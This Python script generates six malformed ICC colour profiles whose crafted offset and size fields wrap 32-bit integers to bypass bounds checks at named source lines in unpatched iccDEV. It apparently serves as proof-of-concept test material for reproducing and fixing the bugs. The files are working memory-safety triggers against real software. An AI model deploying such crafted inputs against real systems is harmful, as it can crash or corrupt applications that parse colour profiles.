#!/usr/bin/env python3
"""Synthesize ICC profiles that trigger unsigned integer overflow (UIO)
at specific offset+size bounds-check sites in unpatched iccDEV.

Each profile is a minimal valid ICC structure with a crafted tag whose
internal offset+size fields wrap uint32.

Usage:
    python3 synthesize_uio_poc.py [--output-dir DIR]

Targets:
  1. IccProfile.cpp:1311  -- tag table entry offset+size > file length
  2. IccMpeCalc.cpp:4745  -- calculator sub-element position offset+size > tag size
  3. IccMpeCalc.cpp:4777  -- calculator function position offset+size > tag size
  4. IccTagDict.cpp:633   -- dict record posName offset+size > tag size
  5. IccTagProfSeqId.cpp:515 -- profile seq id entry offset+size > tag size
  6. iccDumpProfile.cpp:332  -- pad = closest - offset - size (subtraction UIO)
"""

import struct
import os
import hashlib

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "test-profiles")


def be32(v):
    return struct.pack(">I", v & 0xFFFFFFFF)


def be16(v):
    return struct.pack(">H", v & 0xFFFF)


def pad4(data):
    """Pad data to 4-byte boundary."""
    r = len(data) % 4
    if r:
        data += b'\x00' * (4 - r)
    return data


def icc_header(size, device_class=b'mntr', color_space=b'RGB ',
               pcs=b'XYZ ', version=0x04400000):
    """Build a 128-byte ICC header."""
    hdr = bytearray(128)
    struct.pack_into(">I", hdr, 0, size)           # profile size
    hdr[4:8] = b'test'                              # preferred CMM
    struct.pack_into(">I", hdr, 8, version)         # version 4.4
    hdr[12:16] = device_class                       # device class
    hdr[16:20] = color_space                        # color space
    hdr[20:24] = pcs                                # PCS
    # date: 2024-01-01 00:00:00
    struct.pack_into(">HHH", hdr, 24, 2024, 1, 1)
    hdr[36:40] = b'acsp'                            # magic
    hdr[40:44] = b'APPL'                            # platform
    # D50 illuminant (s15Fixed16: 0.9642, 1.0, 0.8249)
    struct.pack_into(">i", hdr, 68, int(0.9642 * 65536))
    struct.pack_into(">i", hdr, 72, int(1.0 * 65536))
    struct.pack_into(">i", hdr, 76, int(0.8249 * 65536))
    return bytes(hdr)


def make_tag_table(entries):
    """Build tag table: 4-byte count + 12-byte entries."""
    data = be32(len(entries))
    for sig, offset, size in entries:
        if isinstance(sig, str):
            sig = sig.encode('ascii')
        data += sig + be32(offset) + be32(size)
    return data


def profile_1_IccProfile_1311():
    """IccProfile.cpp:1311 -- tag entry offset+size wraps uint32.
    
    TagInfo.offset=0x80000000 + TagInfo.size=0x80000100 wraps to 0x100
    which is < pIO->GetLength(), bypassing the bounds check.
    The tag data offset points beyond EOF.
    """
    # Minimal profile: header + 1 tag entry + tiny tag data
    tag_offset = 0x80000000   # huge offset (beyond file)
    tag_size   = 0x80000100   # offset+size wraps to 0x100
    
    tag_table = make_tag_table([
        (b'desc', tag_offset, tag_size),
    ])
    
    # Need a real 'desc' tag at a valid offset for the profile to partially load
    # Put a minimal desc at offset 144 (after header+tag_table)
    desc_data = b'desc' + be32(0) + be32(4) + b'test'
    desc_data = pad4(desc_data)
    
    real_tag_offset = 128 + len(tag_table)
    real_tag_size = len(desc_data)
    
    # Two tags: one valid desc, one with wrapping offset+size
    tag_table = make_tag_table([
        (b'desc', real_tag_offset, real_tag_size),
        (b'cprt', tag_offset, tag_size),  # wrapping entry
    ])
    real_tag_offset = 128 + len(tag_table)
    
    profile_size = real_tag_offset + real_tag_size
    
    # Rebuild with correct offsets
    tag_table = make_tag_table([
        (b'desc', real_tag_offset, real_tag_size),
        (b'cprt', tag_offset, tag_size),
    ])
    
    hdr = icc_header(profile_size)
    return hdr + tag_table + desc_data


def profile_2_IccMpeCalc_4745():
    """IccMpeCalc.cpp:4745 -- calculator sub-element icPositionNumber
    where pos->offset + pos->size > tag_size wraps uint32.
    
    The mpet tag contains a calculator element ('calc') with a sub-element
    position array. One position has offset=0x40, size=0xFFFFFFC0 which
    wraps to 0x00 and bypasses the bounds check.
    """
    # mpet tag type: 'mpet' + reserved(4) + inCh(2) + outCh(2) + numElem(4)
    #   + numElem * (elemSig(4) + reserved(4) + inCh(2) + outCh(2))
    #   + numElem * (offset(4) + size(4))
    # Inside element: 'calc' + reserved(4) + inCh(2) + outCh(2) + nSubElem(4)
    #   + (nSubElem+1) * (offset(4) + size(4))  [positions for sub-elements + calc func]

    # Build the calc element data
    calc_in_ch = 3
    calc_out_ch = 3
    n_sub_elem = 1  # 1 sub-element -> 2 position entries (sub + calcfunc)
    
    # Position array: [sub_elem_0_pos, calcfunc_pos]
    # sub_elem_0: offset=0x40, size=0xFFFFFFC0 -> wraps
    sub_offset = 0x00000040
    sub_size   = 0xFFFFFFC0  # offset + size = 0x100000000 -> wraps to 0
    
    # calcfunc: valid small position
    func_offset = 0x30
    func_size   = 0x10
    
    calc_header = be32(0x63616C63)  # 'calc' element type sig
    calc_header += be32(0)           # reserved
    calc_header += be16(calc_in_ch) + be16(calc_out_ch)
    calc_header += be32(n_sub_elem)
    # Position entries: calcfunc first (index 0), then sub-elements
    calc_header += be32(func_offset) + be32(func_size)    # calcfunc position
    calc_header += be32(sub_offset) + be32(sub_size)      # sub-elem 0 position (WRAPS!)
    
    calc_data = pad4(calc_header)
    calc_elem_size = len(calc_data)
    
    # mpet tag wrapper
    mpet_header = b'mpet'           # type signature
    mpet_header += be32(0)          # reserved
    mpet_header += be16(calc_in_ch) + be16(calc_out_ch)
    mpet_header += be32(1)          # 1 element
    # Element table entry
    mpet_header += be32(0x63616C63) # 'calc'
    mpet_header += be32(0)          # reserved
    mpet_header += be16(calc_in_ch) + be16(calc_out_ch)
    # Position table
    elem_data_offset = len(mpet_header) + 8  # after position table entry
    mpet_header += be32(elem_data_offset) + be32(calc_elem_size)
    
    mpet_data = mpet_header + calc_data
    mpet_data = pad4(mpet_data)
    
    # Build profile
    tag_table_offset = 128
    tag_table = make_tag_table([
        (b'A2B0', 0, 0),  # placeholder
    ])
    mpet_offset = tag_table_offset + len(tag_table)
    mpet_size = len(mpet_data)
    
    tag_table = make_tag_table([
        (b'A2B0', mpet_offset, mpet_size),
    ])
    mpet_offset = tag_table_offset + len(tag_table)
    
    profile_size = mpet_offset + mpet_size
    tag_table = make_tag_table([
        (b'A2B0', mpet_offset, mpet_size),
    ])
    
    hdr = icc_header(profile_size)
    return hdr + tag_table + mpet_data


def profile_3_IccTagDict_633():
    """IccTagDict.cpp:633 -- dict record posName offset+size wraps uint32.
    
    The 'dict' tag contains name/value records. Each record has a
    posName (offset, size) pair. We set offset=0x100, size=0xFFFFFF00
    so offset+size wraps to 0x00.
    """
    # dict tag: 'dict' + reserved(4) + count(4) + reclen(4)
    #   + count * (posName.offset(4) + posName.size(4) +
    #              posValue.offset(4) + posValue.size(4) +
    #              posDisplay.offset(4) + posDisplay.size(4))
    
    count = 1
    rec_len = 24  # 6 uint32s per record (name + value + display)
    
    dict_header = b'dict'           # type sig
    dict_header += be32(0)          # reserved
    dict_header += be32(count)      # 1 record
    dict_header += be32(rec_len)    # record length
    
    # Record: posName with wrapping offset+size
    name_offset = 0x00000100
    name_size   = 0xFFFFFF00  # offset+size wraps to 0
    dict_header += be32(name_offset) + be32(name_size)    # posName (WRAPS!)
    dict_header += be32(0) + be32(0)                       # posValue (empty)
    dict_header += be32(0) + be32(0)                       # posDisplay (empty)
    
    dict_data = pad4(dict_header)
    
    # Build profile with 'meta' tag pointing to dict data
    tag_table_offset = 128
    tag_table = make_tag_table([
        (b'meta', 0, 0),
    ])
    dict_offset = tag_table_offset + len(tag_table)
    dict_size = len(dict_data)
    
    tag_table = make_tag_table([
        (b'meta', dict_offset, dict_size),
    ])
    dict_offset = tag_table_offset + len(tag_table)
    
    profile_size = dict_offset + dict_size
    tag_table = make_tag_table([
        (b'meta', dict_offset, dict_size),
    ])
    
    hdr = icc_header(profile_size)
    return hdr + tag_table + dict_data


def profile_4_IccTagProfSeqId_515():
    """IccTagProfSeqId.cpp:515 -- entry offset+size wraps uint32.
    
    The 'psid' tag contains a count of profile ID entries, each with
    offset+size. We craft one entry where offset+size wraps.
    """
    # psid tag: 'psid' + reserved(4) + count(4)
    #   + count * (offset(4) + size(4))
    #   + entry data
    
    count = 1
    entry_offset = 0x00000040
    entry_size   = 0xFFFFFFC0  # wraps to 0
    
    psid_header = b'psid'           # type sig
    psid_header += be32(0)          # reserved
    psid_header += be32(count)      # 1 entry
    psid_header += be32(entry_offset) + be32(entry_size)  # WRAPS!
    
    psid_data = pad4(psid_header)
    
    # Build profile
    tag_table_offset = 128
    tag_table = make_tag_table([
        (b'psid', 0, 0),
    ])
    psid_tag_offset = tag_table_offset + len(tag_table)
    psid_tag_size = len(psid_data)
    
    tag_table = make_tag_table([
        (b'psid', psid_tag_offset, psid_tag_size),
    ])
    psid_tag_offset = tag_table_offset + len(tag_table)
    
    profile_size = psid_tag_offset + psid_tag_size
    tag_table = make_tag_table([
        (b'psid', psid_tag_offset, psid_tag_size),
    ])
    
    hdr = icc_header(profile_size)
    return hdr + tag_table + psid_data


def profile_5_iccDumpProfile_332():
    """iccDumpProfile.cpp:332 -- pad = closest - offset - size subtraction UIO.
    
    Craft a profile with 2 tags where tag1.offset + tag1.size > tag2.offset,
    causing the subtraction to underflow. Tag offsets must be in the file
    but the sizes are inflated.
    """
    # Two tags with overlapping/inflated sizes
    desc_data = b'desc' + be32(0) + be32(4) + b'test'
    desc_data = pad4(desc_data)
    
    cprt_data = b'text' + be32(0) + be32(5) + b'(c) \x00'
    cprt_data = pad4(cprt_data)
    
    tag_table_offset = 128
    tag_table = make_tag_table([
        (b'desc', 0, 0),
        (b'cprt', 0, 0),
    ])
    
    desc_offset = tag_table_offset + len(tag_table)
    cprt_offset = desc_offset + len(desc_data)
    
    # Inflate desc size so offset+size > cprt_offset (subtraction UIO)
    desc_inflated_size = 0x80000000  # huge size, still < uint32 max
    
    tag_table = make_tag_table([
        (b'desc', desc_offset, desc_inflated_size),
        (b'cprt', cprt_offset, len(cprt_data)),
    ])
    desc_offset = tag_table_offset + len(tag_table)
    cprt_offset = desc_offset + len(desc_data)
    
    tag_table = make_tag_table([
        (b'desc', desc_offset, desc_inflated_size),
        (b'cprt', cprt_offset, len(cprt_data)),
    ])
    desc_offset = tag_table_offset + len(tag_table)
    cprt_offset = desc_offset + len(desc_data)
    
    profile_size = cprt_offset + len(cprt_data)
    
    tag_table = make_tag_table([
        (b'desc', desc_offset, desc_inflated_size),
        (b'cprt', cprt_offset, len(cprt_data)),
    ])
    
    hdr = icc_header(profile_size)
    return hdr + tag_table + desc_data + cprt_data


def profile_6_IccProfile_1311_addition():
    """IccProfile.cpp:1311 -- offset+size addition wraps uint32.
    
    A tag table entry with offset=0x80 and size=0xFFFFFF80 wraps to 0x00.
    The bounds check (offset+size > fileLen) becomes (0x00 > fileLen) = false,
    allowing the tag read to proceed with an out-of-bounds offset.
    """
    # Minimal profile with a tag whose offset is valid but size wraps
    tag_offset = 0x00000080  # points within reasonable range
    tag_size   = 0xFFFFFF80  # offset + size = 0x100000000 -> wraps to 0
    
    desc_data = b'desc' + be32(0) + be32(4) + b'test'
    desc_data = pad4(desc_data)
    
    tag_table_offset = 128
    tag_table = make_tag_table([
        (b'desc', 0, 0),
    ])
    desc_real_offset = tag_table_offset + len(tag_table)
    
    # Two tags: one valid, one with wrapping
    tag_table = make_tag_table([
        (b'desc', desc_real_offset, len(desc_data)),
        (b'wtpt', tag_offset, tag_size),  # wrapping entry
    ])
    desc_real_offset = tag_table_offset + len(tag_table)
    
    profile_size = desc_real_offset + len(desc_data)
    
    tag_table = make_tag_table([
        (b'desc', desc_real_offset, len(desc_data)),
        (b'wtpt', tag_offset, tag_size),
    ])
    
    hdr = icc_header(profile_size)
    return hdr + tag_table + desc_data


def write_profile(name, data, description, output_dir):
    path = os.path.join(output_dir, name)
    with open(path, 'wb') as f:
        f.write(data)
    sha = hashlib.sha256(data).hexdigest()[:12]
    print(f"[OK] {name} ({len(data)} bytes, sha256:{sha})")
    print(f"     Target: {description}")
    return path


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Synthesize UIO trigger ICC profiles")
    parser.add_argument("--output-dir", default=None,
                        help="Output directory (default: test-profiles/)")
    args = parser.parse_args()

    output_dir = args.output_dir if args.output_dir else OUTPUT_DIR
    os.makedirs(output_dir, exist_ok=True)
    
    profiles = [
        ("poc-769-IccProfile-1311-uio-addition.icc",
         profile_6_IccProfile_1311_addition(),
         "IccProfile.cpp:1311 -- offset+size addition wraps uint32"),
        
        ("poc-769-IccMpeCalc-4745-uio-calc-subelem.icc",
         profile_2_IccMpeCalc_4745(),
         "IccMpeCalc.cpp:4745 -- calculator sub-element position wraps"),
        
        ("poc-769-IccTagDict-633-uio-dict-name.icc",
         profile_3_IccTagDict_633(),
         "IccTagDict.cpp:633 -- dict record posName offset+size wraps"),
        
        ("poc-769-IccTagProfSeqId-515-uio-entry.icc",
         profile_4_IccTagProfSeqId_515(),
         "IccTagProfSeqId.cpp:515 -- profile seq id entry wraps"),
        
        ("poc-769-iccDumpProfile-332-uio-pad-sub.icc",
         profile_5_iccDumpProfile_332(),
         "iccDumpProfile.cpp:332 -- pad subtraction UIO"),
        
        ("poc-769-IccProfile-1311-uio-tagtable.icc",
         profile_1_IccProfile_1311(),
         "IccProfile.cpp:1311 -- tag table entry offset+size wraps"),
    ]
    
    print(f"Synthesizing {len(profiles)} UIO trigger profiles...")
    print()
    
    paths = []
    for name, data, desc in profiles:
        paths.append(write_profile(name, data, desc, output_dir))
    
    print()
    print(f"All {len(profiles)} profiles written to {output_dir}/")
    return paths


if __name__ == "__main__":
    main()
